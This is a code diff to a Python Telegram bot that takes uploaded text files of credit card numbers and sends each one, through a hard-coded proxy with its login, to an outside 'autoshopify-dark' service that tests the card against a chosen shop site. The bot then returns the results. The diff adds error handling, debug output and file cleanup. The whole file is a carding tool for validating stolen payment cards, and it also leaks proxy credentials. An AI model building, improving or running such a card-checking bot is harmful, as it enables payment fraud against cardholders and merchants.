@@ -4684,73 +4684,109 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 import aiohttp
 import asyncio
+import os
 from telegram import Update, InputFile
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
-from db import get_user  # your DB function to fetch user data
+from db import get_user  # Your DB function
 
 PROXY = "198.23.239.134:6540:skgbsgwl:7y2hll5e4ycn"
+DOWNLOAD_FOLDER = "./downloads"
+os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
 
 # ---------------- Background card processing ---------------- #
 async def process_cards(update: Update, file_path: str, file_name: str, site: str):
     output_lines = []
 
     async with aiohttp.ClientSession() as session:
-        with open(file_path, "r") as f:
+        # Read all cards
+        with open(file_path, "r", encoding="utf-8") as f:
             cards = [line.strip() for line in f if line.strip()]
 
-        sem = asyncio.Semaphore(5)  # Limit concurrent API requests
+        if not cards:
+            await update.message.reply_text("⚠️ The file is empty.")
+            return
+
+        sem = asyncio.Semaphore(5)  # Limit concurrent requests
 
         async def check_card(card):
             async with sem:
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
+                print("Checking:", api_url)
                 try:
                     async with session.get(api_url) as resp:
-                        data = await resp.json()
-                        response_text = data.get("Response", "No Response")
+                        text = await resp.text()
+                        print("Response:", text[:150])  # Debug: first 150 chars
+                        try:
+                            data = await resp.json()
+                            response_text = data.get("Response", "No Response")
+                        except Exception as e:
+                            response_text = f"JSON Error: {e}"
                         output_lines.append(f"{card} => {response_text}")
                 except Exception as e:
+                    print("Request error:", e)
                     output_lines.append(f"{card} => Error: {e}")
 
+        # Run all requests concurrently
         await asyncio.gather(*(check_card(card) for card in cards))
 
-    output_file_path = f"results_{file_name}"
-    with open(output_file_path, "w") as f:
+    # Save results
+    output_file_path = os.path.join(DOWNLOAD_FOLDER, f"results_{file_name}")
+    with open(output_file_path, "w", encoding="utf-8") as f:
         f.write("\n".join(output_lines))
 
-    # Send result file back
-    await update.message.reply_document(document=InputFile(output_file_path))
+    # Send results back
+    if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
+        await update.message.reply_document(
+            document=InputFile(output_file_path, filename=f"results_{file_name}")
+        )
+    else:
+        await update.message.reply_text("⚠️ Something went wrong, the result file is empty.")
 
+    # Cleanup temp files
+    try:
+        os.remove(file_path)
+        os.remove(output_file_path)
+    except:
+        pass
 
-# ---------------- Unified handler for command & .txt reply ---------------- #
+# ---------------- Handler for command or reply ---------------- #
 async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
 
     if not user_data or not user_data.get("custom_urls"):
-        await update.message.reply_text("You have not added any site. Please add your custom site first.")
+        await update.message.reply_text(
+            "You have not added any site. Please add your custom site first."
+        )
         return
 
     site = user_data["custom_urls"]
 
-    # Get the document (supports replying to a message with a file or sending directly)
-    document = None
-    if update.message.document:
-        document = update.message.document
-    elif update.message.reply_to_message and update.message.reply_to_message.document:
+    # Get document from direct message or reply
+    document = update.message.document
+    if not document and update.message.reply_to_message:
         document = update.message.reply_to_message.document
 
     if not document or not document.file_name.endswith(".txt"):
-        await update.message.reply_text("Please send or reply to a .txt file containing cards.")
+        await update.message.reply_text(
+            "Please send or reply to a .txt file containing cards."
+        )
         return
 
-    await update.message.reply_text("✅ Processing started in the background. You will get results when done!")
+    await update.message.reply_text(
+        "✅ Processing started in the background. You will get results when done!"
+    )
 
+    # Download file to safe folder
+    file_path = os.path.join(DOWNLOAD_FOLDER, f"{update.message.message_id}_{document.file_name}")
     file = await document.get_file()
-    file_path = f"./{document.file_name}"
     await file.download_to_drive(file_path)
 
-    # Run in background
+    # Run processing in background
     asyncio.create_task(process_cards(update, file_path, document.file_name, site))
+
+
+
 
 
 
